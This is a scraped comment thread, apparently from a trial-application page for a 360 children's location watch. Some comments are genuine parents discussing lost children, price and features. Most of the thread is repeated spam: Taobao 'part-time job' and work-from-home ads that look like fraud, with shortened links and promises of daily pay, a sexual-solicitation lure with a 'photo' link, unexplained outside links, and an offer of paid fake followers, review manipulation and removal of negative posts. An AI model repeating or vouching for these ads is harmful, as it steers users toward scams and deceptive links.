非常喜欢这款产品，我家豆豆调皮，喜欢乱跑，老丢。。。这款手表，简直就是为豆豆量身定制的。。希望能通过。。！！！ 非常的强大！！！支持！！！！！！！！！！！ 
非常喜欢这款产品，我家豆豆调皮，喜欢乱跑，老丢。。。这款手表，简直就是为豆豆量身定制的。。希望能通过。。！！！ 非常的强大！！！支持！！！！！！！！！！！ 
非常喜欢这款产品，我家豆豆调皮，喜欢乱跑，老丢。。。这款手表，简直就是为豆豆量身定制的。。希望能通过。。！！！ 非常的强大！！！支持！！！！！！！！！！！ 
360，我会支持你的
价格真心伤不起！
有点太夸张，无法理解。
一个人_寂寞1 一个人_寂寞1 底下痒！我已经好几个月没体验了，岁月是把杀猪刀,黑了木耳,紫了葡萄,软了香蕉！！！ ，谁可以给我！好难受，我需要那个！！这里可以看到【照片地址】【 http://www.dwz.cn/i1TIa 】 想找个人来我家做，底下痒！我已经好几个月没体验了。从上到下，都抚摸一遍！好想来一次！  
一个人_寂寞1 一个人_寂寞1 底下痒！我已经好几个月没体验了，岁月是把杀猪刀,黑了木耳,紫了葡萄,软了香蕉！！！ ，谁可以给我！好难受，我需要那个！！这里可以看到【照片地址】【 http://www.dwz.cn/i1TIa 】 想找个人来我家做，底下痒！我已经好几个月没体验了。从上到下，都抚摸一遍！好想来一次！  
一个人_寂寞1 一个人_寂寞1 底下痒！我已经好几个月没体验了，岁月是把杀猪刀,黑了木耳,紫了葡萄,软了香蕉！！！ ，谁可以给我！好难受，我需要那个！！这里可以看到【照片地址】【 http://www.dwz.cn/i1TIa 】 想找个人来我家做，底下痒！我已经好几个月没体验了。从上到下，都抚摸一遍！好想来一次！  
非常实用的东西。
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
很喜欢 非常需要 期待中
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O ～1 O O左右。（宝妈、学生、上班族都可以）有意者 请博客联系我 http://blog.sina.com.cn/s/blog_dd683eb30101dhg6.html  
一个人_寂寞1 一个人_寂寞1 底下痒！我已经好几个月没体验了，岁月是把杀猪刀,黑了木耳,紫了葡萄,软了香蕉！！！ ，谁可以给我！好难受，我需要那个！！这里可以看到【照片地址】【 http://www.dwz.cn/i1TIa 】 想找个人来我家做，底下痒！我已经好几个月没体验了。从上到下，都抚摸一遍！好想来一次！   
很喜欢 期待
我已经好几个月没体验了，岁月是把杀猪刀,黑了木耳,紫了葡萄,软了香蕉！！！ ，谁可以给我！好难受，我需要那个！！这里可以看到【照片地址】【 http://www.dwz.cn/i1TIa 】 想找个人来我家做，底下痒！我已经好几个月没体验了。从上到下，都抚摸一遍！好想来一次！  
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
这个东西好，但担心车子以后会不会被入侵。。。呵呵
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O ～1 O O左右。（宝妈、学生、上班族都可以）有意者请博客联系我 http://blog.sina.com.cn/s/blog_dd683eb30101dhg6.html 
好产品，就是太贵啦！
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
支持此次试用，希望能够当我侄儿的生日礼物~
希望能通过哦，我家宝贝曾经差点走失！
很好，希望减少孩子丢失，也希望可以减少犯罪
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O ～1 O O左右。（宝妈、学生、上班族都可以） 有意者请博客联系我 http://blog.sina.com.cn/s/blog_dd683eb30101dhg6.html  
期待。。。一起动起来！
时间还差两天已经14万申请了，期待满满！！
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
我也申请了，提示还在筛查中。不知什么样的人才能通过。要是能买最好了.
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
好酷，实用。
好喜欢这产品，想要呀！
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O ～1 O O左右。（宝妈、学生、上班族都可以） 有意者 请博客联系我 http://blog.sina.com.cn/s/blog_dd683eb30101dhg6.html
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
我已经好几个月没体验了，岁月是把杀猪刀,黑了木耳,紫了葡萄,软了香蕉！！！ ，谁可以给我！好难受，我需要那个！！这里可以看到【照片地址】【 http://www.dwz.cn/i1TIa 】 想找个人来我家做，底下痒！我已经好几个月没体验了。从上到下，都抚摸一遍！好想来一次！   
我已经好几个月没体验了，岁月是把杀猪刀,黑了木耳,紫了葡萄,软了香蕉！！！ ，谁可以给我！好难受，我需要那个！！这里可以看到【照片地址】【 http://www.dwz.cn/i1TIa 】 想找个人来我家做，底下痒！我已经好几个月没体验了。从上到下，都抚摸一遍！好想来一次！   
我已经好几个月没体验了，岁月是把杀猪刀,黑了木耳,紫了葡萄,软了香蕉！！！ ，谁可以给我！好难受，我需要那个！！这里可以看到【照片地址】【 http://www.dwz.cn/i1TIa 】 想找个人来我家做，底下痒！我已经好几个月没体验了。从上到下，都抚摸一遍！好想来一次！   
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O ～1 O O左右。（宝妈、学生、上班族都可以） 有意者请博客联系我 http://blog.sina.com.cn/s/blog_dd683eb30101dhg6.html  
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
期待中，快点出来吧
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
我也申请了，提示还在筛查中。不知什么样的人才能通过。要是能买最好了
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O ～1 O O左右。（宝妈、学生、上班族都可以） 有意者 请博客联系我 http://blog.sina.com.cn/s/blog_dd683eb30101dhg6.html  
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
一个孩子上幼儿园一个孩子上小学，现在的社会就怕孩子在外不安全，在学校也不是很放心，非常期待能试用，最好快点上市
我已经好几个月没体验了，岁月是把杀猪刀,黑了木耳,紫了葡萄,软了香蕉！！！ ，谁可以给我！好难受，我需要那个！！这里可以看到【照片地址】【 http://www.dwz.cn/i1TIa 】 想找个人来我家做，底下痒！我已经好几个月没体验了。从上到下，都抚摸一遍！好想来一次！   
我已经好几个月没体验了，岁月是把杀猪刀,黑了木耳,紫了葡萄,软了香蕉！！！ ，谁可以给我！好难受，我需要那个！！这里可以看到【照片地址】【 http://www.dwz.cn/i1TIa 】 想找个人来我家做，底下痒！我已经好几个月没体验了。从上到下，都抚摸一遍！好想来一次！   
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
太慢慢慢了
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O ～1 O O左右。（宝妈、学生、上班族都可以） 有意者请博客联系我 http://blog.sina.com.cn/s/blog_dd683eb30101dhg6.html  
宝宝很调皮，每次都不敢带她出去玩和旅游，每次一眨眼的时间人就找不到了，所以每次只敢带她在附近转转，希望自己可以通过，谢谢，我希望这款产品可以摆脱我现在的烦恼
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
现在最关心的就是孩子的安全，支持360的好产品
这个表要钱吗？
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
欢迎；好好还好还好
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O ～1 O O左右。（宝妈、学生、上班族都可以） 有意者 请博客联系我 http://blog.sina.com.cn/s/blog_dd683eb30101dhg6.html  
360，我会支持你的  
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
我的收到了
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
喜欢，平时自己老是丢三落四，有这个就不怕了
创意很好的东西
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O ～1 O O左右。（宝妈、学生、上班族都可以） 有意者请博客联系我 http://blog.sina.com.cn/s/blog_dd683eb30101dhg6.html
非常喜欢这款产品，我家豆豆调皮，喜欢乱跑，老丢。。。这款手表，简直就是为豆豆量身定制的。。希望能通过。。！！！ 非常的强大！！！支持！！！！！！！！！！！ 
非常喜欢这款产品，我家豆豆调皮，喜欢乱跑，老丢。。。这款手表，简直就是为豆豆量身定制的。。希望能通过。。！！！ 非常的强大！！！支持！！！！！！！！！！！  
非常喜欢这款产品，我家豆豆调皮，喜欢乱跑，老丢。。。这款手表，简直就是为豆豆量身定制的。。希望能通过。。！！！ 非常的强大！！！支持！！！！！！！！！！！  
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
非常喜欢这款产品，我家豆豆调皮，喜欢乱跑，老丢。。。这款手表，简直就是为豆豆量身定制的。。希望能通过。。！！！ 非常的强大！！！支持！！！！！！！！！！！  
非常喜欢这款产品，我家豆豆调皮，喜欢乱跑，老丢。。。这款手表，简直就是为豆豆量身定制的。。希望能通过。。！！！ 非常的强大！！！支持！！！！！！！！！！！  
要xian吗不知道
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
NO,NO,NO
非常喜欢这款产品，我家豆豆调皮，喜欢乱跑，老丢。。。这款手表，简直就是为豆豆量身定制的。。希望能通过。。！！！ 非常的强大！！！支持！！！！！！！！！！！  
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O ～1 O O左右。（宝妈、学生、上班族都可以） 有意者请博客联系我 http://blog.sina.com.cn/s/blog_dd683eb30101dhg6.html 
好想要一个哦
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
非常喜欢这款产品，我家豆豆调皮，喜欢乱跑，老丢。。。这款手表，简直就是为豆豆量身定制的。。希望能通过。。！！！ 非常的强大！！！支持！！！！！！！！！！！  
非常喜欢这款产品，我家豆豆调皮，喜欢乱跑，老丢。。。这款手表，简直就是为豆豆量身定制的。。希望能通过。。！！！ 非常的强大！！！支持！！！！！！！！！！！  
非常喜欢这款产品，我家豆豆调皮，喜欢乱跑，老丢。。。这款手表，简直就是为豆豆量身定制的。。希望能通过。。！！！ 非常的强大！！！支持！！！！！！！！！！！  
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
感觉很好唉...给天天乱跑的弟弟申请一个...
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O ～1 O O左右。（宝妈、学生、上班族都可以） 有意者请博客联系我 http://blog.sina.com.cn/s/blog_dd683eb30101dhg6.html  
为了宝宝，一定要申请成功！！
非常喜欢这款产品，我家图雅调皮，喜欢乱跑，老丢。。。这款手表，简直就是为豆豆量身定制的。。希望能通过。。！！！ 非常的强大！！！支持！！！！！！！！！！！  
非常喜欢这款产品，我家图雅调皮，喜欢乱跑，老丢。。。这款手表，简直就是为图雅量身定制的。。希望能通过。。！！！ 非常的强大！！！支持！！！！！！！！！！！
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
安全~是家长给孩子的最好的礼物。
有更好的方法http://xsdf007.kuphp.net
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
彤彤一看上这款手表就中意了，非常喜欢，希望可以通过！家里也没有多少资金，为了宝贝，加油！
http://zjdf164.kuphp.net
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O ～1 O O左右。（宝妈、学生、上班族都可以） 有意者请博客联系我 http://blog.sina.com.cn/s/blog_dd683eb30101dhg6.html  
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
如果手表被坏人戴在其它人的手上 怎么定位啊 如果手表被换人丢掉了  怎么办啊 如果手边坏了或者是没有电力  怎么办啊
要钱吗这个
创意不错，实用性也强
既然有SIM卡就应该增加一键直拨父、母（监护人）手机
什么时候出呀。我要做地区代理
相当不错的创意，好像蛮有用的样子。不过别太大了
东东看来不错，但有些贵了
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O ～1 O O左右。（宝妈、学生、上班族都可以） 有意者 请博客联系我 http://blog.sina.com.cn/s/blog_dd683eb30101dhg6.html  
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
看不懂怎么用的，和现在用的360随身WIFI似乎很不同
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
360真给力  
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
这个确实不错，希望防水防震，别太大
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O ～1 O O左右。（宝妈、学生、上班族都可以） 有意者请博客联系我 http://blog.sina.com.cn/s/blog_dd683eb30101dhg6.html  
很好，希望价格不要太高，否则就没有吸引力了
弟弟特爱出去玩，上次不小心把他搞丢了...找到他的时候他和他同学在玩...帮弟弟申请一个，作为儿童节的礼物...希望可以通过！！！
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
怎么搞的呀？我的申请还没结果?等了很久了！前面空气净化器申请失败，这次是不是可以给个机会呢？
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
真希望自己能够申请成功，幸运啥时可以落到我的身上，呵呵
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
   如此神奇  快赐我一个啊  谢谢伟大的 360    
希望新产品能给孩子们带来安宁！
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
弟弟特爱出去玩，上次不小心把他搞丢了...找到他的时候他和他同学在玩...帮弟弟申请一个，作为儿童节的礼物...希望可以通过！！！
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O ～1 O O左右。（宝妈、学生、上班族都可以） 有意者请博客联系我 http://blog.sina.com.cn/s/blog_dd683eb30101dhg6.html   
专业承接网络推广： 1.负面删除清理 2.各种负面发布及压制 3.新闻发布 4.论坛发帖回复加精置顶，首页推荐 5.微博刷粉、转发评论、红人转发 6.微信刷粉、大号转发 7.百度百科、360、搜搜百科，互动百科创建 8.文库发布，百度地图标注 9.各类问答发布，百度经验发布 10.视频发布、点击、首页推荐 11.博客发布，分类信息发布 12.QQ群发，各类投票 Q1793910433 
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
当下儿童安全问题的确是个问题，也是一个市场，继续朝这个方向发展，相信会受到更多人的喜爱与接受，支持！
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O ～1 O O左右。（宝妈、学生、上班族都可以） 有意者请博客联系我 http://blog.sina.com.cn/s/blog_dd683eb30101dhg6.html  
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
不错啊，这个东西是好东西！ 紫轩藏品网www.bjzxcp.com
我期待！！兴奋!!!
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8s5dBA0【复制到地址栏打开】
